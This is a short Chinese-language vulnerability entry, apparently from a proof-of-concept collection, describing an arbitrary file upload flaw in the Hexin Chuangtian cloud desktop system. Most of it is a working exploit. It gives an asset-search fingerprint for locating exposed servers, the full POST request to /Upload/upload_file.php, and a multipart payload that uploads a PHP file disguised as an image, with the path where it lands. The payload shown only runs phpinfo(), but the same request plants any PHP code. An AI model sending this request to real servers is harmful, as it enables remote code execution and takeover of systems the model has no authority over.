# 和信创天云桌面系统upload_file存在任意文件上传

- **系统**：和信创天云桌面系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="和信下一代云桌面"`
- **请求**：`POST /Upload/upload_file.php?l=1 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv`　`Content-Length: 192`

**请求体 / payload**
```
------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/avif
<?php phpinfo(); ?>
------WebKitFormBoundaryfcKRltGv--

上传文件位置
/Upload/1/test.php
```

**其他**
- 和信创天云桌面系统upload\_file存在任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 和信创天云桌面系统